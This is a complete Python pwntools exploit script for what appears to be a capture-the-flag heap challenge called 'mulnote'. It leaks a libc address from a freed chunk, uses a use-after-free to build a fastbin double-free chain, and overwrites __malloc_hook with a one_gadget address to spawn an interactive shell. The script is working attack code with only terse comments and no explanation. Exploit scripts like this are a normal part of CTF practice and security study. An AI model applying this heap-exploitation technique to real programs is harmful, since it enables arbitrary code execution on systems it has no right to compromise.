from pwn import *
context.binary = './mulnote'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc
p = process('./mulnote')

def dbg():
	raw_input()

def exploit():
	sa = lambda x, y: p.sendafter(x, y)
	sla = lambda x, y: p.sendlineafter(x, y)

	def create(size, content):
		sa('>', 'C')
		sa('size>', str(size))
		sa('note>',content)
		p.recvuntil('DONE\n')
		print "create chunk success!"

	def show(idx):
		sa('>', 'S')
		for i in range(idx):
			p.recvline()
			p.recvline()
		p.recvline()
		print "show success!"

	def delete(idx):
		sa('>', 'R')
		sa('index>', str(idx))
		print "delete %d chunk sucess" % idx


	def edit(idx, content):
		size = len(content)
		sa('>', 'E')
		sa('index>', str(idx))
		sa('new note>',content)
		p.recvuntil('DONE\n')
	#	print "edit %d chunk success!" % idx

	create(0x90, 'a'*0x90)		#0
	create(0x60, 'b'*0x40)		#1
	create(0x60, 'c'*0x40)		#2
	create(0x60, 'd'*0x40)		#3

	#gdb.attach(p)
	#dbg()

	#leak libc
	delete(0)
	show(0)
	libc_base = u64(p.recvline().strip('\x0a').ljust(8, '\x00')) - 0x3c4b78
	__malloc_hook = libc_base + libc.symbols['__malloc_hook']
	one_gadget = libc_base + 0x4526a
	print "libc_base ==> " + hex(libc_base)

	#use after free make a double free chain
	#	2->3->2->fake_chunk
	delete(2)
	delete(3)
	delete(2)

	create(0x60, p64(__malloc_hook - 0x13))			#chunk1' fd
	create(0x60, 'g'*0x40)									#junk chunk
	create(0x60, 'k'*0x40)									#junk chunk

	create(0x60, 'a'*3 + p64(one_gadget))

	p.interactive()
	p.close()


if __name__ == '__main__':
	exploit()